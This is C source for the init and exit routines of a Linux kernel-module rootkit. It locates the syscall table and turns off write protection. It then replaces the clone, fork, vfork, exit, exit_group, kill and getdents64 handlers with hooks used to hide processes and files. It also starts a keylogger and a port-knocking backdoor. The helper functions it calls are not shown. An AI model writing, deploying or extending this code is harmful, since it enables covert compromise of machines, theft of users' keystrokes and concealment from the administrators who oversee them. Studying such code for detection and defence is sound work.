#include "main.h"

static unsigned long *syscall_table;

asmlinkage long (*orig_clone)(unsigned long, unsigned long, int __user *, unsigned long, int __user *);
sys_call_stub orig_fork;
sys_call_stub orig_vfork;
sys_call_stub orig_exit;
sys_call_stub orig_exit_group;
sys_call_stub orig_kill;
sys_call_stub orig_getdents64;

struct semaphore hidden_pid_list_sem;

static int __init lkm_rootkit_init(void)
{
    printk(KERN_INFO "Hello, World!\n");

    if (proc_init() || hidefs_init() || keylogger_init() || port_knocking_init())
    {
        proc_clean();
        hidefs_clean();
        return -1;
    }

    // module_hide();
    sema_init(&hidden_pid_list_sem, 1);

    syscall_table = find_syscall_table();
    FM_INFO("Found syscall_table at %lx\n", *syscall_table);

    orig_clone = (asmlinkage long (*)(unsigned long, unsigned long, int __user *, unsigned long, int __user *_))syscall_table[__NR_clone];
    orig_fork = (sys_call_stub)syscall_table[__NR_fork];
    orig_vfork = (sys_call_stub)syscall_table[__NR_vfork];
    orig_exit = (sys_call_stub)syscall_table[__NR_exit];
    orig_exit_group = (sys_call_stub)syscall_table[__NR_exit_group];
    orig_kill = (sys_call_stub)syscall_table[__NR_kill];
    orig_getdents64 = (sys_call_stub)syscall_table[__NR_getdents64];

    disable_write_protect();

    syscall_table[__NR_clone] = (unsigned long)rk_clone;
    syscall_table[__NR_fork] = (unsigned long)rk_fork;
    syscall_table[__NR_vfork] = (unsigned long)rk_vfork;
    syscall_table[__NR_exit] = (unsigned long)rk_exit;
    syscall_table[__NR_exit_group] = (unsigned long)rk_exit_group;
    syscall_table[__NR_kill] = (unsigned long)rk_kill;
    syscall_table[__NR_getdents64] = (unsigned long)rk_getdents64;
    enable_write_protect();

    return 0;
}

static void __exit lmk_rootkit_exit(void)
{
    proc_clean();
    hidefs_clean();
    keylogger_clean();
    port_knocking_clean();

    disable_write_protect();

    syscall_table[__NR_clone] = (unsigned long)orig_clone;
    syscall_table[__NR_fork] = (unsigned long)orig_fork;
    syscall_table[__NR_vfork] = (unsigned long)orig_vfork;
    syscall_table[__NR_exit] = (unsigned long)orig_exit;
    syscall_table[__NR_exit_group] = (unsigned long)orig_exit_group;
    syscall_table[__NR_kill] = (unsigned long)orig_kill;
    syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;

    enable_write_protect();

    printk(KERN_INFO "Goodbye, World!\n");
}
